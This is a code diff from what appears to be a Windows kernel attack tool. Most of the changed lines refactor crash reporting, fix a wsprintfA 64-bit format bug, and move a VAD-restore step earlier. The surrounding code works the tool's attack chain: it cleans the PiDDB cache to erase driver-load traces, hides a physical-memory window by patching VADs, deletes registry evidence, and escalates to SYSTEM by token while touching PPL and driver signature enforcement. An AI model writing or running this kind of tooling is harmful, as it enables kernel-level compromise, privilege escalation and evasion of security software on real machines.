@@ -144,25 +144,51 @@ static void SafeRestore() {
     }
 }
 
-static void ReportCrash() {
-    // GetExceptionCode() is an intrinsic and may only be used directly inside a
-    // __except block, so read the code off the stashed record instead.
+// Print the details of whatever exception was last trapped. Split out so the
+// sweep's own handler can report with the same detail as the top level.
+static void PrintCrashDetail(const char* what) {
     ULONG code = 0;
     ULONG64 rip = 0;
     if (g_LastException) {
         code = (ULONG)g_LastException->ExceptionRecord->ExceptionCode;
         rip = (ULONG64)g_LastException->ContextRecord->Rip;
     }
-    char buf[320] = {};
-    int n = wsprintfA(buf,
-        "\r\n[!!!] CRASH 0x%08lX at RIP 0x%llX during: %s\r\n"
-        "[!!!] %u VAD patch(es) still applied - restoring them now\r\n",
-        (unsigned long)code, (unsigned long long)rip, PhaseName(g_Phase),
-        (unsigned)WindowVadPatchCount());
+    char buf[400] = {};
+    // wsprintfA is a legacy Win32 formatter and does not understand %ll: it
+    // parses "%llX" as "%l" followed by literal "lX", which consumes one
+    // argument and shifts every argument after it. Split 64-bit values into
+    // high and low dwords instead.
+    //
+    // A RIP inside our own image is only useful relative to the image base, so
+    // report that too - it turns "crashed somewhere in the exe" into an offset
+    // that resolves against the module.
+    ULONG64 selfBase = (ULONG64)(UINT_PTR)GetModuleHandleA(NULL);
+    ULONG64 rel = (selfBase && rip >= selfBase && rip < selfBase + 0x01000000ULL)
+                    ? rip - selfBase : 0;
+    wsprintfA(buf,
+        "\r\n[!!!] %s hit an exception 0x%08lX\r\n"
+        "[!!!] at RIP 0x%08lX%08lX (image 0x%08lX%08lX, offset 0x%08lX%08lX)\r\n",
+        what, (unsigned long)code,
+        (unsigned long)(rip >> 32), (unsigned long)rip,
+        (unsigned long)(selfBase >> 32), (unsigned long)selfBase,
+        (unsigned long)(rel >> 32), (unsigned long)rel);
     RawWrite(buf);
+}
+
+static void ReportCrash() {
+    ULONG patches = (ULONG)WindowVadPatchCount();
+    PrintCrashDetail("the run");
+
+    char buf[200] = {};
+    wsprintfA(buf, "[!!!] %u VAD patch(es) still applied - restoring them now\r\n", patches);
+    RawWrite(buf);
+
     SafeRestore();
 }
 
+// The name sweep is best-effort trace cleanup. It must never take the tool down
+// with it, so any exception in it ends the sweep rather than the run - but it is
+// reported in full, because a silently skipped sweep is a silent failure.
 static bool IsSystemToken(HANDLE hToken) {
     if (!hToken) return false;
     BYTE buf[256] = {};
@@ -442,7 +468,16 @@ static int RunBody() {
     CleanPiDDBCache(deviceHandle, &sc, systemCr3, &kOffsets, driverFileName);
 
     MmCleanupContext mmCtx = {};
-    bool mmPrepared = PrepareMmCleanup(deviceHandle, &sc, systemCr3, &kOffsets, &mmCtx);
+    bool mmPrepared = PrepareMmCleanup(deviceHandle, &sc, systemCr3, &kOffsets,
+                                      driverFileName, &mmCtx);
+
+    // Put the VADs back now, before anything else touches the window again
+    // (PPL, DSE, verification). A VAD tree that claims 64 KiB for a 1 GiB section
+    // is exactly what makes those steps fault, and restoring here means the
+    // process can never exit - cleanly or not - with a truncated VAD still in
+    // place.
+    g_Phase = PH_RESTORE;
+    RestorePhysWindow();
 
     g_Phase = PH_UNLOAD;
     printf("\n[*] Unloading driver...\n");
@@ -469,14 +504,6 @@ static int RunBody() {
         DoSyscall(sc.NtClose, (ULONG_PTR)keyHandle, 0, 0, 0);
     }
     printf("[+] Registry key deleted\n");
-
-    // Put the VADs back as soon as the hidden-window work is done. Everything
-    // below still walks the window (PPL, DSE, verification), and a VAD tree
-    // that claims 64 KiB for a 1 GiB section is exactly what makes those steps
-    // fault. Restoring here also means the process can never exit - cleanly or
-    // not - with a truncated VAD still in place.
-    g_Phase = PH_RESTORE;
-    RestorePhysWindow();
 
     g_Phase = PH_PPL;
     // Primary token first: this is what makes the *process* SYSTEM. The thread
